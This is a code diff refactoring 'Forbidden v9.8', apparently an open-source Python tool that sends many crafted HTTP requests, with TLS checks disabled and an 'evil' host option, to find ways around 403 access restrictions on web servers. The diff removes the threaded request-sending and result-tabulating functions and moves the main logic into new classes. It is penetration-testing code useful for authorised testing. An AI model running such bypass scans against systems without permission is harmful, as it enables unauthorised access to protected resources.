-		if record["ignore"] and (record["ignore"]["text"] and re.search(record["ignore"]["text"], response.content.decode("ISO-8859-1"), re.MULTILINE | re.IGNORECASE) or record["ignore"]["lengths"] and any(record["length"] == length for length in record["ignore"]["lengths"])):
-			record["code"] = 0
-	except (requests.packages.urllib3.exceptions.LocationParseError, requests.exceptions.RequestException) as ex:
-		if debug:
-			print_error(("{0}\n{1}").format(ex, record["command"]))
-	finally:
-		if response is not None:
-			response.close()
-		session.close()
-	return record
-
-def send_curl(record, sleep = None, debug = None):
-	if sleep:
-		time.sleep(sleep)
-	encoding = "UTF-8"
-	cookiefile = tempfile.NamedTemporaryFile(mode = "r")
-	response = io.BytesIO()
-	curl = pycurl.Curl()
-	curl.setopt(pycurl.CONNECTTIMEOUT, 90)
-	curl.setopt(pycurl.TIMEOUT, 180)
-	curl.setopt(pycurl.VERBOSE, False)
-	curl.setopt(pycurl.SSL_VERIFYPEER, False)
-	curl.setopt(pycurl.SSL_VERIFYHOST, False)
-	curl.setopt(pycurl.FOLLOWLOCATION, True)
-	curl.setopt(pycurl.MAXREDIRS, 10)
-	curl.setopt(pycurl.PATH_AS_IS, True)
-	if record["body"]:
-		curl.setopt(pycurl.POSTFIELDS, record["body"].encode(encoding))
-	if record["headers"]:
-		curl.setopt(pycurl.HTTPHEADER, [header.encode(encoding) for header in record["headers"]])
-	if record["agent"]:
-		curl.setopt(pycurl.USERAGENT, record["agent"].encode(encoding))
-	if record["proxy"]:
-		curl.setopt(pycurl.PROXY, record["proxy"].encode(encoding))
-	curl.setopt(pycurl.CUSTOMREQUEST, record["method"])
-	curl.setopt(pycurl.URL, record["url"].encode(encoding))
-	curl.setopt(pycurl.WRITEFUNCTION, response.write)
-	curl.setopt(pycurl.COOKIEFILE, cookiefile.name)
-	curl.setopt(pycurl.COOKIEJAR, cookiefile.name)
-	try:
-		curl.perform()
-		record["code"] = int(curl.getinfo(pycurl.RESPONSE_CODE))
-		record["length"] = int(curl.getinfo(pycurl.SIZE_DOWNLOAD))
-		if record["ignore"] and (record["ignore"]["text"] and re.search(record["ignore"]["text"], response.getvalue().decode("ISO-8859-1"), re.MULTILINE | re.IGNORECASE) or record["ignore"]["lengths"] and any(record["length"] == length for length in record["ignore"]["lengths"])):
-			record["code"] = 0
-	except pycurl.error as ex:
-		if debug:
-			print_error(("{0}\n{1}").format(ex, record["command"]))
-	finally:
-		response.close()
-		curl.close()
-		cookiefile.close()
-	return record
-
-def remove(array, keys):
-	for entry in array:
-		for key in keys:
-			entry.pop(key, None)
-	return array
-
-def output(record, color):
-	termcolor.cprint(jdump(record), color)
-	return record
-
-def create_table(results):
-	table = [{"code": code, "count": 0} for code in sorted(unique(record["code"] for record in results))]
-	for entry in table:
-		for record in results:
-			if record["code"] == entry["code"]:
-				entry["count"] += 1
-	return table
-
-def table_horizontal_border():
-	print("-" * 22)
-
-def table_row(code, count, color = None):
-	text = ("| {0:<6} | {1:<9} |").format(code, count)
-	termcolor.cprint(text, color) if color else print(text)
-
-def table_header():
-	table_row("Code", "Count")
-
-def display_table(table):
-	table_horizontal_border()
-	table_header()
-	table_horizontal_border()
-	for entry in table:
-		color = None
-		if entry["code"] >= 500:
-			color = "cyan"
-		elif entry["code"] >= 400:
-			color = "red"
-		elif entry["code"] >= 300:
-			color = "yellow"
-		elif entry["code"] >= 200:
-			color = "green"
-		table_row(entry["code"], entry["count"], color)
-	table_horizontal_border()
-
-def parse_results(results):
-	tmp = []
-	# --------------------
-	get_timestamp("Validating results...")
-	# --------------------
-	table = create_table(results)
-	# --------------------
-	results = [record for record in results if record["code"] > 0]
-	results = sorted(results, key = lambda x: (x["code"], -x["length"], x["raw"]))
-	results = remove(results, ["raw", "ignore", "proxy", "curl"])
-	for record in results:
-		if record["code"] >= 500:
-			continue
-			tmp.append(output(record, "cyan"))
-		elif record["code"] >= 400:
-			continue
-			tmp.append(output(record, "red"))
-		elif record["code"] >= 300:
-			# continue
-			tmp.append(output(record, "yellow"))
-		elif record["code"] >= 200:
-			# continue
-			tmp.append(output(record, "green"))
-	# --------------------
-	display_table(table)
-	# --------------------
-	return tmp
-
-def bypass(collection, threads = 10, sleep = None, debug = None):
-	results = []
-	count = 0
-	total = len(collection)
-	print(("Number of created test records: {0}").format(total))
-	get_timestamp("Running tests...")
-	progress(count, total)
-	with concurrent.futures.ThreadPoolExecutor(max_workers = threads) as executor:
-		subprocesses = []
-		for record in collection:
-			subprocesses.append(executor.submit(send_curl if record["curl"] else send_request, record, sleep, debug))
-		for subprocess in concurrent.futures.as_completed(subprocesses):
-			results.append(subprocess.result())
-			count += 1
-			progress(count, total)
-	return results
+# ----------------------------------------
 
 def main():
-	argc = len(sys.argv) - 1
-
-	if argc == 0:
-		advanced()
-	elif argc == 1:
-		if sys.argv[1] == "-h":
-			basic()
-		elif sys.argv[1] == "--help":
-			advanced()
-		else:
-			error("Incorrect usage", True)
-	elif argc % 2 == 0 and argc <= len(args) * 2:
-		for i in range(1, argc, 2):
-			validate(sys.argv[i], sys.argv[i + 1])
-		if args["url"] is None or args["tests"] is None or not check(argc, args):
-			error("Missing a mandatory option (-u, -t) and/or optional (-f, -v, -p, -e, -i, -l, -th, -s, -a, -x, -o, -dbg)", True)
-	else:
-		error("Incorrect usage", True)
-
-	if proceed:
+	validate = Validate()
+	if validate.run():
 		print("##########################################################################")
 		print("#                                                                        #")
 		print("#                             Forbidden v9.8                             #")
@@ -1265,54 +1824,29 @@ def main():
 		print("# Feel free to donate ETH at 0xbc00e800f29524AD8b0968CEBEAD4cD5C5c1f105. #")
 		print("#                                                                        #")
 		print("##########################################################################")
-		# --------------------
-		if not args["path"]:
-			args["path"] = ["/robots.txt"] # can have multiple
-		if not args["evil"]:
-			args["evil"] = "github.com"
-		if not args["threads"]:
-			args["threads"] = 5
-		if not args["agent"]:
-			args["agent"] = "Forbidden/9.8"
-		# --------------------
-		url = parse_url(args["url"])
-		ignore = {"text": args["ignore"], "lengths": args["lengths"] if args["lengths"] else []}
-		# --------------------
-		# NOTE: Fetch content length of base HTTP response.
-		if "base" in ignore["lengths"]:
-			record = fetch(url["full"], args["force"] if args["force"] else "GET", None, None, None, args["agent"], None)
-			if record:
-				print(("Ignoring base HTTP response length: {0}").format(record["length"]))
-				ignore["lengths"].append(record["length"])
-			ignore["lengths"].pop(ignore["lengths"].index("base"))
-		# --------------------
-		# NOTE: Fetch accessible URLs and their content lengths.
-		records = fetch_accessible(append_paths(url["scheme_domain"], args["path"]), args["force"] if args["force"] else "GET", None, None, None, args["agent"], None)
-		accessible = unique(record["url"] for record in records)
-		if "path" in ignore["lengths"]:
-			if records:
-				print(("Ignoring accessible URL response length: {0}").format((" | ").join([str(record["length"]) for record in records])))
-				ignore["lengths"].extend([record["length"] for record in records])
-			ignore["lengths"].pop(ignore["lengths"].index("path"))
-		# --------------------
-		# NOTE: Fetch base domain IPs.
-		ips = fetch_ips(url["domain_no_port"])
-		values = args["values"] + ips if args["values"] else ips
-		# --------------------
-		collection = get_collection(url, args["tests"], accessible, args["evil"], args["force"], values, ignore, args["agent"], args["proxy"])
-		if not collection:
-			print("No test records were created")
-		else:
-			results = parse_results(bypass(filter(get_commands(collection)), args["threads"], args["sleep"], args["debug"]))
-			if not results:
-				print("No result matched the validation criteria")
-			else:
-				print(("Number of valid results: {0}").format(len(results)))
-				if args["out"]:
-					write_file(jdump(results), args["out"])
+		out = validate.get_arg("out")
+		forbidden = Forbidden(
+			validate.get_arg("url"),
+			validate.get_arg("ignore_qsf"),
+			validate.get_arg("ignore_curl"),
+			validate.get_arg("tests"),
+			validate.get_arg("force"),
+			validate.get_arg("values"),
+			validate.get_arg("path"),
+			validate.get_arg("evil"),
+			validate.get_arg("ignore"),
+			validate.get_arg("lengths"),
+			validate.get_arg("threads"),
+			validate.get_arg("sleep"),
+			validate.get_arg("agent"),
+			validate.get_arg("proxy"),
+			validate.get_arg("debug")
+		)
+		forbidden.run()
+		results = forbidden.get_results()
+		if results and out:
+			write_file(jdump(results), out)
 		print(("Script has finished in {0}").format(datetime.datetime.now() - start))
 
 if __name__ == "__main__":
 	main()
-
-# ------------------------ TASK END ------------------------
